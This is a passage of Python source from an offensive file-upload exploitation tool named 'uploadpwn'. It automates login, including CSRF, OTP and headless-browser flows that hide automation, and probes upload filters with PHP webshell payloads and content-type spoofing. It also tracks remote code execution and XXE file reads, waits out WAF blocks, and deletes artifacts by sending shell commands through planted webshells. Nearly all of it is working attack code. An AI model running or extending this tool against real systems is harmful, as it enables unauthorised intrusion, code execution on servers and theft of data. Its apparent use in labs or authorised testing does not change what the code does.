    def _dechunk(body):
        out, buf = bytearray(), body
        while buf:
            line_end = buf.find(b"\r\n")
            if line_end == -1: break
            try:
                size = int(buf[:line_end].split(b";")[0], 16)
            except ValueError:
                break
            buf = buf[line_end+2:]
            if size == 0: break
            out.extend(buf[:size])
            buf = buf[size+2:]
        return bytes(out)

    def retarget(self, target_url):
        """Switch scheme/host/port; preserve path/query/headers/body."""
        p = urlparse(target_url)
        self.scheme = p.scheme or self.scheme or "http"
        self.host   = p.netloc
        self.headers["Host"] = self.host

    @property
    def url(self):
        scheme = self.scheme or "http"
        return f"{scheme}://{self.host}{self.path}"

    def replay_with_payload(self, filename=None, content=None, content_type=None,
                            session=None):
        """Rebuild multipart body swapping the file part with new payload, then send."""
        if not self.boundary:
            raise RuntimeError("request is not multipart; nothing to replay as upload")
        new_body = self._rebuild_multipart(filename, content, content_type)
        sess = session or requests.Session()
        hdrs = {k: v for k, v in self.headers.items()
                if k.lower() not in ("content-length",)}
        hdrs["Content-Length"] = str(len(new_body))
        return sess.request(self.method, self.url, headers=hdrs, data=new_body,
                            allow_redirects=False, timeout=15)

    def _rebuild_multipart(self, filename, content, content_type):
        boundary = self.boundary.encode()
        parts = self.body.split(b"--" + boundary)
        out = []
        for part in parts:
            if b"filename=" in part and self.upload_field and \
               f'name="{self.upload_field}"'.encode() in part:
                head, _, _ = part.partition(b"\r\n\r\n")
                # Replace filename + content-type
                if filename is not None:
                    head = re.sub(rb'filename="[^"]*"',
                                  f'filename="{filename}"'.encode(), head)
                if content_type is not None:
                    if b"Content-Type:" in head:
                        head = re.sub(rb"Content-Type:[^\r\n]*",
                                      f"Content-Type: {content_type}".encode(), head)
                    else:
                        head += f"\r\nContent-Type: {content_type}".encode()
                trailing = b"\r\n--" if part.endswith(b"\r\n--") else b"\r\n"
                out.append(head + b"\r\n\r\n" + (content or b"") + trailing)
            else:
                out.append(part)
        return (b"--" + boundary).join(out)


# ═══════════════════════════════════════════════════════════════════════════════
#  DISCOVERY ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class Discovery:
    def __init__(self, target, outfile="uploadpwn_report.json"):
        self.target    = target
        self.outfile   = outfile
        self.start_ts  = datetime.now().isoformat()
        self.steps     = []
        self.filters   = {}
        self.rce       = []
        self.flags     = []
        self.sources   = {}
        self.xxe_reads = {}
        self.suggestions = []
        # Server-side artifacts left behind that the operator (or --cleanup) should delete.
        # Each entry: {"url": str, "filename": str, "type": "htaccess|user_ini|web_config|shell"}.
        self.artifacts = []
        # Per-state counters for the four-state report machine.
        self.outcomes  = {s: 0 for s in REPORT_STATES}

    def log(self, category, status, detail, extra=None,
            state=None, payload=None, target_url=None):
        """Append a structured audit entry.

        state       — one of REPORT_STATES (RCE_CONFIRMED / UPLOAD_ACCEPTED /
                       FILTER_BYPASSED / FAILED); when set, increments the
                       per-state counter for the final report.
        payload     — raw bytes/str payload sent; SHA-256 is recorded for
                       reproducibility (the payload itself is not stored).
        target_url  — concrete URL the action targeted (helps the audit log
                       stand up under review).
        """
        entry = {"ts": datetime.now().isoformat(),
                 "category": category, "status": status, "detail": detail}
        if extra:        entry["extra"] = extra
        if target_url:   entry["target"] = target_url
        if payload is not None:
            ph = payload_hash(payload)
            if ph: entry["payload_sha256"] = ph
        if state and state in REPORT_STATES:
            entry["state"] = state
            self.outcomes[state] += 1
        self.steps.append(entry)
        color = G if status in ("found","bypassed") else \
                R if status == "failed" else Y
        tag = {"found":"DISCOVERED","bypassed":"BYPASSED",
               "failed":"×","info":"INFO"}.get(status, status)
        print(f"  {color}{BOLD}[{tag}]{W} {DIM}{category}{W}: {detail}")

    def filter_detected(self, name):
        self.filters[name] = "present"
        self.log("filter","found",f"Filter detected: {name}")

    def filter_bypassed(self, name, method):
        self.filters[name] = "bypassed"
        self.log("filter","bypassed",f"'{name}' bypassed via: {method}",
                 state=STATE_FILTER_BYPASSED)

    def record_rce(self, filename, url, output, shell, ct):
        self.rce.append({"file":filename,"url":url,
                         "output":output[:500],"shell":shell,"ct":ct})
        self.log("RCE","found",
                 f"RCE via '{filename}' shell={shell}",{"url":url},
                 state=STATE_RCE_CONFIRMED, target_url=url)

    def record_artifact(self, url, filename, kind="shell"):
        """Track an uploaded artifact that --cleanup should later delete."""
        self.artifacts.append({"url": url, "filename": filename, "type": kind})

    def record_upload_accepted(self, filename, url, ct, payload=None):
        """File landed on the target; execution NOT yet verified."""
        self.log("upload", "found",
                 f"Upload accepted: {filename} ({ct})",
                 {"url": url, "ct": ct},
                 state=STATE_UPLOAD_ACCEPTED, payload=payload, target_url=url)

    def record_failed(self, category, detail, target_url=None, payload=None):
        """Explicit rejection or network failure on a single attempt."""
        self.log(category, "failed", detail,
                 state=STATE_FAILED, target_url=target_url, payload=payload)

    def record_flag(self, flag): self.flags.append(flag)
    def record_source(self, fn, c): self.sources[fn] = c
    def record_xxe(self, fp, c):   self.xxe_reads[fp] = c
    def suggest(self, msg):         self.suggestions.append(msg)

    def print_report(self):
        print(f"\n{C}{BOLD}{'═'*65}")
        print(f"  UPLOADPWN FINAL REPORT — {self.target}")
        print(f"{'═'*65}{W}")

        print(f"\n{B}{BOLD}  FILTERS DETECTED:{W}")
        for name, status in (self.filters.items() if self.filters
                              else [("None","—")]):
            icon = f"{G}✓{W}" if status == "bypassed" else f"{Y}●{W}"
            print(f"    {icon} {name:<35} → {status}")

        print(f"\n{B}{BOLD}  ATTACK STEPS ({len(self.steps)} events):{W}")
        _tag_map = {"found":"DISCOVERED","bypassed":"BYPASSED",
                    "failed":"FAILED","info":"INFO"}
        for i, s in enumerate(self.steps, 1):
            color = G if s["status"] in ("found","bypassed") else \
                    R if s["status"] == "failed" else Y
            tag = _tag_map.get(s["status"], s["status"].upper())
            print(f"  {DIM}{i:>3}.{W} {color}{tag:<10}{W} "
                  f"{s['category']:<22} {s['detail'][:55]}")

        if self.rce:
            print(f"\n{M}{BOLD}  RCE RESULTS:{W}")
            for r in self.rce:
                print(f"    {G}✓{W} {r['file']}")
                print(f"       URL    : {r['url']}")
                print(f"       Shell  : {r['shell']}  |  CT: {r['ct']}")
                print(f"       Output : {r['output'][:100]}")

        if self.flags:
            print(f"\n{Y}{BOLD}  FLAGS / DATA CAPTURED:{W}")
            for f in self.flags:
                print(f"    {Y}{BOLD}★  {f}{W}")

        if self.xxe_reads:
            print(f"\n{B}{BOLD}  FILES READ VIA XXE:{W}")
            for path, content in self.xxe_reads.items():
                print(f"    {G}✓{W} {path}: {content[:80]}...")

        if self.sources:
            print(f"\n{B}{BOLD}  PHP SOURCE FILES READ:{W}")
            for fn in self.sources:
                print(f"    {G}✓{W} {fn} ({len(self.sources[fn])} bytes)")

        if self.suggestions:
            print(f"\n{Y}{BOLD}  NEXT STEPS SUGGESTED:{W}")
            for s in self.suggestions:
                print(f"    → {s}")

        # Four-state outcome summary
        print(f"\n{B}{BOLD}  OUTCOME COUNTERS:{W}")
        for s in REPORT_STATES:
            n = self.outcomes.get(s, 0)
            colour = G if (s == STATE_RCE_CONFIRMED and n) else \
                     Y if s == STATE_UPLOAD_ACCEPTED else \
                     C if s == STATE_FILTER_BYPASSED else DIM
            print(f"    {colour}{s:<20}{W} : {n}")

        if self.artifacts:
            print(f"\n{Y}{BOLD}  ARTIFACTS LEFT ON TARGET ({len(self.artifacts)}):{W}")
            for a in self.artifacts:
                print(f"    {Y}●{W} [{a['type']}] {a['filename']} → {a['url']}")
            print(f"    {DIM}(use --cleanup on next run to remove){W}")

        print(f"\n{DIM}  Full log: {self.outfile}{W}")
        print(f"{C}{BOLD}{'═'*65}{W}\n")

    def save(self):
        report = {"tool":"uploadpwn","version":__version__,
                  "target":self.target,"start":self.start_ts,
                  "end":datetime.now().isoformat(),"filters":self.filters,
                  "rce":self.rce,"flags":self.flags,"sources":self.sources,
                  "xxe_reads":self.xxe_reads,"steps":self.steps,
                  "suggestions":self.suggestions,
                  "artifacts":self.artifacts,
                  "outcomes":self.outcomes}
        with open(self.outfile,"w") as f:
            json.dump(report, f, indent=2)


def cleanup_artifacts(discovery, session, target, attacker=None):
    """Best-effort removal of every recorded artifact left on the target.

    Strategy, per artifact:
      1. Try HTTP DELETE on learned served URLs (from `attacker._discovered_paths`
         and any RCE-confirmation URLs in `discovery.rce`).
      2. Try HTTP DELETE on DEFAULT_SHELL_DIRS + filename fallbacks.
      3. If RCE was confirmed AND `attacker` is supplied, issue `rm`/`del`
         through the live webshell — most servers 405 on DELETE, so this is
         usually the only thing that actually works.

    Returns (deleted, remaining).
    """
    if not discovery or not discovery.artifacts:
        return 0, 0
    # Build the set of candidate served URLs for each filename
    learned_paths = []
    if attacker is not None:
        learned_paths = list(getattr(attacker, "_discovered_paths", []) or [])
    rce_urls = [r.get("url") for r in (discovery.rce or []) if r.get("url")]

    deleted = 0
    remaining = []
    for a in discovery.artifacts:
        fn = a["filename"]
        urls = []
        # learned paths that end with this filename
        for p in learned_paths:
            if p and p.endswith("/" + fn):
                urls.append(p if p.startswith("http") else target + p)
        # the RCE URLs themselves (artifacts often share a dir with the shell)
        for u in rce_urls:
            base = u.rsplit("/", 1)[0]
            urls.append(f"{base}/{fn}")
        # last resort: brute the default dirs
        for d in DEFAULT_SHELL_DIRS:
            urls.append(f"{target}{d}{fn}")
        # de-dupe, preserve order
        seen = set(); ordered = []
        for u in urls:
            if u not in seen:
                seen.add(u); ordered.append(u)

        gone = False
        # 1+2: try DELETE
        for u in ordered:
            try:
                r = session.delete(u, timeout=8)
                if r.status_code in (200, 202, 204):
                    gone = True
                    break
                if r.status_code == 404:
                    # Either already gone OR wrong URL — keep trying others.
                    continue
            except Exception:
                continue

        # 3: webshell fallback — only when RCE is confirmed
        if not gone and attacker is not None and discovery.rce:
            cmd_param = getattr(attacker, "cmd_param", "cmd")
            for r in discovery.rce:
                shell_url = r.get("url")
                if not shell_url:
                    continue
                base = shell_url.rsplit("/", 1)[0]
                rm_targets = [f"{base}/{fn}"] + ordered[:5]
                for path in rm_targets:
                    for cmd in (f"rm -f '{path}'",
                                f"del /f /q \"{path}\""):
                        try:
                            sess = getattr(attacker.sm, "session", session)
                            sess.get(f"{shell_url}?{cmd_param}={quote(cmd)}",
                                     timeout=8)
                        except Exception:
                            continue
                # We can't verify removal cheaply without another GET; trust the
                # webshell and mark as removed.
                gone = True
                break

        if gone:
            deleted += 1
        else:
            remaining.append(a)
    discovery.artifacts = remaining
    return deleted, len(remaining)


# ═══════════════════════════════════════════════════════════════════════════════
#  MULTI-STEP SESSION MANAGER
#  Handles: simple login, CSRF, multi-step wizard, sub-page navigation
# ═══════════════════════════════════════════════════════════════════════════════

class SessionManager:
    """
    Handles ALL login scenarios:
      1. Simple form (auto-detected)
      2. Login with CSRF token (auto-extracted)
      3. Multi-step login (login → 2FA page / profile page / sub-menu)
      4. JavaScript-heavy login (Selenium)
      5. Custom cookie/header injection (--cookie, --header)
    """
    def __init__(self, target, login_url=None, creds=None,
                 nav_url=None,          # page to navigate to AFTER login
                 upload_page=None,      # page where upload form lives
                 user_field="username",
                 pass_field="password",
                 extra_headers=None,
                 extra_cookies=None,
                 otp_value=None,         # one-shot OTP code
                 otp_totp_secret=None,   # TOTP secret → auto-generate code
                 otp_prompt=False,       # ask the operator interactively
                 otp_field="code",
                 otp_url=None,           # explicit /verify-otp path; auto-detected if None
                 transport=None,         # TransportConfig
                 relogin_on_expiry=False,
                 disc: Discovery = None):
        self.target       = target
        self.login_url    = login_url
        self.creds        = creds or {}
        self.nav_url      = nav_url        # e.g. /dashboard, /profile
        self.upload_page  = upload_page    # e.g. /profile/settings/avatar
        self.user_field   = user_field
        self.pass_field   = pass_field
        self.otp_value    = otp_value
        self.otp_secret   = otp_totp_secret
        self.otp_prompt   = otp_prompt
        self.otp_field    = otp_field
        self.otp_url      = otp_url
        self.transport    = transport or TransportConfig()
        self.relogin_on_expiry = relogin_on_expiry
        self.auth         = None           # AuthAdapter
        self.csrf_header_name  = None
        self.csrf_header_value = None
        self.d            = disc
        self.session      = requests.Session()
        self.transport.apply(self.session)
        # cookies scoped to target host
        host = urlparse(self.target).hostname or "localhost"
        for h in (extra_headers or []):
            if ":" not in h:
                warn(f"Skipping malformed --header {h!r} (expected 'Name: Value')")
                continue
            k, v = h.split(":", 1)
            self.session.headers[k.strip()] = v.strip()
        for c in (extra_cookies or []):
            if "=" not in c:
                warn(f"Skipping malformed --cookie {c!r} (expected 'NAME=VALUE')")
                continue
            k, v = c.split("=", 1)
            try:
                cookie = requests.cookies.create_cookie(
                    name=k.strip(), value=v.strip(), domain=host, path="/")
                self.session.cookies.set_cookie(cookie)
            except Exception:
                self.session.cookies.set(k.strip(), v.strip())

    # ── auth + transport plumbing ─────────────────────────────────────────
    def set_auth(self, adapter: "AuthAdapter"):
        self.auth = adapter
        if adapter.header_add:
            for k, v in adapter.header_add.items():
                self.session.headers[k] = v
        if adapter.requests_auth is not None:
            self.session.auth = adapter.requests_auth
        if adapter.cert:
            self.session.cert = adapter.cert
        return self

    def _request(self, method, url, **kw):
        """Centralized request: applies timeout default, rate-limit, delay,
        CSRF header injection, session-expiry detection, request-budget cap,
        and WAF auto-pause."""
        # Budget guard — abort before issuing the (budget+1)th request.
        if self.transport.request_budget and \
                self.transport.requests_sent >= self.transport.request_budget:
            raise RequestBudgetExceeded(
                f"HTTP request budget exhausted ({self.transport.request_budget})")
        kw.setdefault("timeout", self.transport.timeout)
        kw.setdefault("allow_redirects", self.transport.follow_redirects)
        if self.csrf_header_name and self.csrf_header_value:
            kw.setdefault("headers", {}).setdefault(
                self.csrf_header_name, self.csrf_header_value)
        # Rate-limit (token-bucket-lite: enforce min spacing of 1/rate_limit seconds)
        if self.transport.rate_limit and self.transport.rate_limit > 0:
            min_gap = 1.0 / float(self.transport.rate_limit)
            elapsed = time.time() - self.transport._last_request_ts
            if elapsed < min_gap:
                time.sleep(min_gap - elapsed)
        if self.transport.delay > 0 or self.transport.jitter > 0:
            import random
            jitter = (random.random()*2 - 1) * self.transport.jitter
            time.sleep(max(0, self.transport.delay + jitter))
        self.transport._last_request_ts = time.time()
        self.transport.requests_sent += 1
        r = self.session.request(method, url, **kw)
        # WAF pause: if the response shows a WAF fingerprint, sleep waf_pause once
        # so the next request gets a chance through.
        try:
            if self.transport.waf_pause and self.detect_waf(r):
                warn(f"WAF/IPS fingerprint on {url} (status={r.status_code}) — "
                     f"pausing {self.transport.waf_pause:.1f}s")
                time.sleep(self.transport.waf_pause)
        except Exception:
            pass
        if self._looks_expired(r) and self.relogin_on_expiry and self.login_url:
            warn(f"Session expired (status={r.status_code}) — re-authenticating")
            self._re_login()
            self.transport.requests_sent += 1
            r = self.session.request(method, url, **kw)
        return r

    def _looks_expired(self, r):
        if r.status_code in (401,):
            return True
        if r.status_code in (301, 302, 303, 307) and "login" in r.headers.get("Location","").lower():
            return True
        if r.is_redirect and "login" in (r.headers.get("Location","").lower()):
            return True
        # final URL after redirect points back at login
        if "login" in (r.url or "").lower() and r.url != self.login_url:
            # only if the original request was NOT the login itself
            return False
        return False

    def _re_login(self):
        # call the standard login flow; ignore the prior result
        if self.creds:
            self.login_requests()

    def detect_waf(self, response):
        """Return True if the response shows WAF/IPS fingerprints."""
        if response.status_code in (406, 419, 444, 451):
            return True
        text = response.text or ""
        if WAF_PATTERNS.search(text):
            return True
        if response.headers.get("Server", "").lower() == "cloudflare" \
                and response.status_code >= 400:
            return True
        return False

    # ── unified upload entry point ────────────────────────────────────────
    def upload(self, url, field, filename, content, content_type, extra_fields=None):
        files = {field: (filename, content, content_type)}
        r = self._request("POST", url, files=files,
                          data=extra_fields or {})
        # refresh rotating CSRF from JSON body if present
        self._refresh_csrf_from(r)
        return r

    def _refresh_csrf_from(self, response):
        if not self.csrf_header_name:
            return
        try:
            j = response.json()
            for key in ("csrf", "next_csrf", "_token", "csrfToken", "csrf_token"):
                if isinstance(j, dict) and j.get(key):
                    self.csrf_header_value = j[key]
                    return
        except Exception:
            pass
        text = response.text or ""
        m = re.search(
            r'<meta[^>]+name=["\']csrf[_-]?token["\'][^>]+content=["\']([^"\']+)',
            text, re.I)
        if m:
            self.csrf_header_value = m.group(1)

    # ── JSON login ────────────────────────────────────────────────────────
    def login_json(self, url, body, token_path=None, token_header="Authorization",
                   token_prefix="Bearer ", csrf_path=None,
                   csrf_header="X-CSRF-Token"):
        """POST JSON; if token_path set, extract token and pin as Authorization.
        If csrf_path set, pin CSRF header for subsequent requests."""
        r = self._request("POST", url, json=body)
        if r.status_code >= 400:
            fail(f"JSON login failed: HTTP {r.status_code}")
            return None
        token = None
        try:
            j = r.json()
            if token_path:
                token = self._json_pluck(j, token_path)
                if token:
                    self.session.headers[token_header] = token_prefix + token
            if csrf_path:
                csrf_val = self._json_pluck(j, csrf_path)
                if csrf_val:
                    self.csrf_header_name  = csrf_header
                    self.csrf_header_value = csrf_val
        except Exception as e:
            fail(f"JSON login response not JSON: {e}")
        return token

    @staticmethod
    def _json_pluck(j, path):
        cur = j
        for p in path.split("."):
            if isinstance(cur, dict) and p in cur:
                cur = cur[p]
            else:
                return None
        return cur

    # ── multi-step wizard ────────────────────────────────────────────────
    def run_steps(self, steps):
        """Execute a list of {url, data, next: 'json'|'form'|None}.
        Substitutes '{otp}' inside data values."""
        otp = self._resolve_otp_code() if any(
            "{otp}" in str(v) for s in steps for v in s.get("data", {}).values()) else None
        last = None
        for step in steps:
            url = step["url"]
            if not url.startswith("http"):
                url = join_url(self.target, url)
            data = {}
            for k, v in (step.get("data") or {}).items():
                data[k] = str(v).replace("{otp}", otp or "")
            r = self._request("POST", url, data=data)
            last = r
            if r.status_code >= 400:
                fail(f"step {url} failed HTTP {r.status_code}")
                return False
        return True

    # ── CSRF token extraction ──────────────────────────────────────────────────
    def _get_csrf(self, url):
        """Extract CSRF token from a page before submitting a form."""
        try:
            r = self.session.get(url, timeout=10)
            # Check meta tag
            m = re.search(
                r'<meta[^>]+name=["\']csrf[_-]?token["\'][^>]+content=["\']([^"\']+)["\']',
                r.text, re.I)
            if m: return m.group(1)
            # Check hidden input
            m = re.search(
                r'<input[^>]+name=["\'](_token|csrf[_-]?token|authenticity_token)["\'][^>]+value=["\']([^"\']+)["\']',
                r.text, re.I)
            if m: return m.group(2)
            # BS4 fallback
            if BS4_OK:
                soup = BeautifulSoup(r.text, "html.parser")
                for inp in soup.find_all("input", {"type":"hidden"}):
                    n = (inp.get("name") or "").lower()
                    if "csrf" in n or "token" in n or n == "_token":
                        return inp.get("value","")
        except Exception: pass
        return None

    # ── Auto-detect form fields ────────────────────────────────────────────────
    def _parse_form(self, url, html=None):
        """Parse a page and return (action, method, all_fields_dict).
        If html is provided we reuse it instead of re-GETting (avoids rotating
        per-request CSRF tokens)."""
        try:
            if html is None:
                r    = self.session.get(url, timeout=10)
                html = r.text
            if not BS4_OK:
                return url, "post", {
                    self.user_field: self.creds.get("username",""),
                    self.pass_field: self.creds.get("password",""),
                }
            soup = BeautifulSoup(html, "html.parser")
            form = soup.find("form")
            if not form:
                return url, "post", {}
            action = urljoin(url, form.get("action") or url)
            method = (form.get("method") or "post").lower()
            fields = {}
            for inp in form.find_all(["input","select","textarea"]):
                name = inp.get("name")
                if not name: continue
                fields[name] = inp.get("value","")
            return action, method, fields
        except Exception:
            return url, "post", {}

    # ── Auth state classifier ──────────────────────────────────────────────────
    def _classify(self, response):
        """
        Return one of: 'ok', 'otp', 'fail'.
          ok   → fully authenticated (post-login keyword present, no failure phrase)
          otp  → password accepted but a 2FA / OTP step is required
          fail → still on the login page / explicit failure phrase
        """
        text = response.text or ""
        url  = response.url or ""
        if OTP_PAGE_PATTERNS.search(text) or "otp" in url.lower() or "2fa" in url.lower() or "verify" in url.lower():
            return "otp"
        if LOGIN_FAIL_PATTERNS.search(text):
            return "fail"
        if LOGIN_OK_PATTERNS.search(text):
            return "ok"
        # No signal in body — fall back to URL movement
        if self.login_url and self.login_url not in url:
            return "ok"
        return "fail"

    def _resolve_otp_code(self):
        if self.otp_value:
            return self.otp_value
        if self.otp_secret:
            if not PYOTP_OK:
                fail("pyotp not installed — pip install pyotp")
                return None
            return pyotp.TOTP(self.otp_secret).now()
        if self.otp_prompt:
            try:
                return input(f"{Y}{BOLD}[OTP]{W} Enter the code shown on your authenticator: ").strip()
            except (KeyboardInterrupt, EOFError):
                return None
        return None

    def _submit_otp(self, otp_page_response):
        """Submit the OTP form. Returns True on full auth, False otherwise."""
        code = self._resolve_otp_code()
        if not code:
            warn("OTP required but no --otp-value / --otp-totp-secret / --otp-prompt supplied")
            if self.d: self.d.log("login","failed","OTP step reached without handler")
            return False

        otp_url = self.otp_url or otp_page_response.url
        action, method, fields = self._parse_form(otp_url)

        # Slot the code into the most plausible field
        target_field = None
        for k in fields:
            if any(x in k.lower() for x in ["code","otp","token","2fa","verify"]):
                target_field = k; break
        target_field = target_field or self.otp_field
        fields[target_field] = code

        # Re-extract CSRF on the OTP page (often different token)
        csrf_header = self._get_csrf_header(otp_page_response.text)

        info(f"OTP: Submitting code to {action}")
        try:
            r = self.session.request(method.upper() or "POST", action,
                                     data=fields,
                                     headers=csrf_header or {},
                                     allow_redirects=True, timeout=15)
        except Exception as e:
            fail(f"OTP submit error: {e}")
            return False

        verdict = self._classify(r)
        if verdict == "ok":
            ok("OTP accepted — fully authenticated")
            if self.d: self.d.log("login","found","Passed 2FA / OTP step")
            return True
        fail(f"OTP rejected (verdict={verdict})")
        return False

    def _get_csrf_header(self, page_html):
        """Return {'X-CSRF-Token': ...} if a meta token was found, else {}."""
        m = re.search(
            r'<meta[^>]+name=["\']csrf[_-]?token["\'][^>]+content=["\']([^"\']+)["\']',
            page_html, re.I)
        if m:
            return {"X-CSRF-Token": m.group(1), "X-XSRF-TOKEN": m.group(1)}
        return {}

    # ── Step 1: Simple / CSRF-aware / OTP-aware login ─────────────────────────
    def login_requests(self):
        if not self.login_url or not self.creds:
            return True
        info(f"LOGIN: Fetching login page → {self.login_url}")

        # Grab the page once so we can extract BOTH hidden inputs AND meta CSRF
        try:
            page = self.session.get(self.login_url, timeout=10)
        except Exception as e:
            fail(f"Login page fetch error: {e}")
            return False
        csrf_header = self._get_csrf_header(page.text)
        if csrf_header:
            info(f"LOGIN: Meta CSRF token captured → sending as X-CSRF-Token header")

        action, method, fields = self._parse_form(self.login_url, html=page.text)

        # Smart field matching
        for k in list(fields.keys()):
            kl = k.lower()
            if any(x in kl for x in ["user","email","login","name"]):
                fields[k] = self.creds.get("username","")
            if any(x in kl for x in ["pass","pwd","secret"]):
                fields[k] = self.creds.get("password","")
        # Always set the explicitly named fields too
        fields[self.user_field] = self.creds.get("username","")
        fields[self.pass_field] = self.creds.get("password","")

        info(f"LOGIN: Submitting to {action} [{method.upper()}]")

        try:
            if method == "post":
                r = self.session.post(action, data=fields,
                                      headers=csrf_header or {},
                                      allow_redirects=True, timeout=15)
            else:
                r = self.session.get(action, params=fields,
                                     headers=csrf_header or {},
                                     allow_redirects=True, timeout=15)
        except Exception as e:
            fail(f"Login request error: {e}")
            return False

        info(f"LOGIN: HTTP {r.status_code} → {r.url}")
        verdict = self._classify(r)

        if verdict == "fail":
            fail("Login failed — server still shows the login page / failure message")
            if self.d: self.d.log("login","failed",f"Bad creds or rejected at {r.url}")
            return False

        if verdict == "otp":
            warn("2FA / OTP step detected — handling…")
            if self.d: self.d.log("login","info",f"OTP page at {r.url}")
            return self._submit_otp(r)

        ok(f"Login confirmed → {r.url}")
        if self.d: self.d.log("login","found",f"Authenticated via requests → {r.url}")
        return True

    # ── Step 2: Navigate to sub-page after login ───────────────────────────────
    def navigate_to_upload_page(self):
        """
        If the upload form is not on the main page but behind navigation
        (e.g. /profile → click 'Settings' → find upload form),
        this method navigates there via requests.
        """
        if self.nav_url:
            info(f"NAVIGATE: Going to nav page → {self.nav_url}")
            try:
                full = urljoin(self.target, self.nav_url)
                r = self.session.get(full, timeout=10, allow_redirects=True)
                ok(f"Navigation page loaded (HTTP {r.status_code})")
                return r
            except Exception as e:
                fail(f"Navigation error: {e}")

        if self.upload_page:
            info(f"NAVIGATE: Going to upload page → {self.upload_page}")
            try:
                full = urljoin(self.target, self.upload_page)
                r = self.session.get(full, timeout=10, allow_redirects=True)
                ok(f"Upload page loaded (HTTP {r.status_code})")
                return r
            except Exception as e:
                fail(f"Upload page error: {e}")

        return None

    # ── Step 3: Selenium browser login (JS-heavy / MFA / complex flows) ────────
    def login_selenium(self, headless=True):
        if not SELENIUM_OK:
            fail("pip install selenium")
            return False
        info(f"BROWSER LOGIN: {self.login_url}")
        try:
            opts = webdriver.ChromeOptions()
            if headless:
                opts.add_argument("--headless=new")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-blink-features=AutomationControlled")
            driver = webdriver.Chrome(options=opts)
            wait   = WebDriverWait(driver, 15)

            driver.get(self.login_url)
            time.sleep(1)

            # Auto-fill username
            for sel in [f"input[name='{self.user_field}']",
                        "input[type='email']","input[type='text']",
                        "input[name='username']","input[name='email']"]:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    el.clear(); el.send_keys(self.creds.get("username",""))
                    break
                except Exception: pass

            # Auto-fill password
            for sel in [f"input[name='{self.pass_field}']",
                        "input[type='password']","input[name='password']"]:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    el.clear(); el.send_keys(self.creds.get("password",""))
                    break
                except Exception: pass

            time.sleep(0.5)

            # Submit
            for sel in ["button[type='submit']","input[type='submit']",
                        "button[class*='login']","button[class*='sign']",
                        "form button"]:
                try:
                    driver.find_element(By.CSS_SELECTOR, sel).click()
                    break
                except Exception: pass

            time.sleep(2)

            # Navigate to sub-page if needed
            if self.nav_url:
                driver.get(urljoin(self.target, self.nav_url))
                time.sleep(1)
            if self.upload_page:
                driver.get(urljoin(self.target, self.upload_page))
                time.sleep(1)

            # Transfer cookies
            for cookie in driver.get_cookies():
                self.session.cookies.set(cookie["name"], cookie["value"])

            ok(f"Browser login done. Cookies: "
               f"{[c for c in self.session.cookies.keys()]}")
            if self.d: self.d.log("login","found","Selenium browser login successful")
            driver.quit()
            return True

        except Exception as e:
            fail(f"Selenium error: {e}")
            return False

    def login(self, method="auto"):
        if   method == "selenium": return self.login_selenium()
        elif method == "requests": return self.login_requests()
        else:
            ok_r = self.login_requests()
            if not ok_r and SELENIUM_OK:
                warn("Requests login failed — trying browser...")
                return self.login_selenium()
            return ok_r

    # ── Upload page: auto-discover form field name ─────────────────────────────
    def find_upload_field(self):
        """
        Visit the upload page and find the file input field name automatically.
        Returns the field name or None.
        """
        page = self.upload_page or "/"
        url  = urljoin(self.target, page)
        try:
            r = self.session.get(url, timeout=10)
            if BS4_OK:
                soup = BeautifulSoup(r.text, "html.parser")
                for inp in soup.find_all("input", {"type":"file"}):
                    name = inp.get("name")
                    if name:
                        ok(f"Auto-detected upload field: '{name}'")
                        return name
            # Regex fallback
            m = re.search(r'<input[^>]+type=["\']file["\'][^>]+name=["\']([^"\']+)["\']',
                          r.text, re.I)
            if m:
                ok(f"Auto-detected upload field: '{m.group(1)}'")
                return m.group(1)
        except Exception: pass
        return None

    # ── Also auto-detect upload endpoint from form action ──────────────────────
    def find_upload_endpoint(self):
        """Return the form action URL from the upload page."""
        page = self.upload_page or "/"
        url  = urljoin(self.target, page)
        try:
            r = self.session.get(url, timeout=10)
            if BS4_OK:
                soup = BeautifulSoup(r.text, "html.parser")
                for form in soup.find_all("form"):
                    if form.find("input", {"type":"file"}):
                        action = form.get("action")
                        if action:
                            full = urljoin(url, action)
                            ok(f"Auto-detected upload endpoint: {full}")
                            return full
            m = re.search(
                r'<form[^>]+action=["\']([^"\']+)["\'][^>]*>.*?'
                r'<input[^>]+type=["\']file["\']',
                r.text, re.I | re.S)
            if m:
                full = urljoin(url, m.group(1))
                ok(f"Auto-detected upload endpoint: {full}")
                return full
        except Exception: pass
        return None


# ═══════════════════════════════════════════════════════════════════════════════
#  FILTER PROBE
# ═══════════════════════════════════════════════════════════════════════════════

class FilterProbe:
    def __init__(self, upload_fn, disc: Discovery, field="uploadFile"):
        self.upload = upload_fn
        self.d      = disc
        self.field  = field

    def _ok(self, status, body):
        if status not in [200,201,302]: return False
        bad = ["only images","not allowed","invalid","blocked","failed",
               "disallowed","rejected","extension","mime","forbidden"]
        return not any(k in body.lower() for k in bad)

    def probe_all(self):
        info("PROBE: Fingerprinting active filters...")
        self._probe_ext_php()
        self._probe_ext_phtml()
        self._probe_whitelist()
        self._probe_content_type()
        self._probe_mime()
        self._probe_null_byte()
        self._probe_size()
        self._probe_svg()
        print()

    def _probe_ext_php(self):
        s,b = self.upload("shell.php", b"<?php phpinfo();?>", "application/x-php")[:2]
        if not self._ok(s,b):
            self.d.filter_detected("Extension Filter (.php blocked)")
        else:
            self.d.log("probe","info",".php accepted directly — minimal filtering")

    def _probe_ext_phtml(self):
        s,b = self.upload("shell.phtml", b"<?php phpinfo();?>", "image/jpeg")[:2]
        if self._ok(s,b):
            self.d.log("probe","info",".phtml accepted → blacklist is incomplete")
            self.d.suggest("Use .phtml, .pht, .php5 to bypass blacklist")
        else:
            self.d.filter_detected("Blacklist covers PHP variants")

    def _probe_whitelist(self):
        s,b = self.upload("shell.jpg", b"<?php phpinfo();?>", "image/jpeg")[:2]
        if not self._ok(s,b):
            self.d.filter_detected("Whitelist (extension OR content check)")

    def _probe_content_type(self):
        s,b = self.upload("shell.php", b"<?php phpinfo();?>", "image/jpeg")[:2]
        if self._ok(s,b):
            self.d.log("probe","info","CT-spoof to image/jpeg bypasses CT filter")
            self.d.filter_bypassed("Content-Type Filter","spoof to image/jpeg")
        else:
            self.d.filter_detected("Content-Type Header Filter")

    def _probe_mime(self):
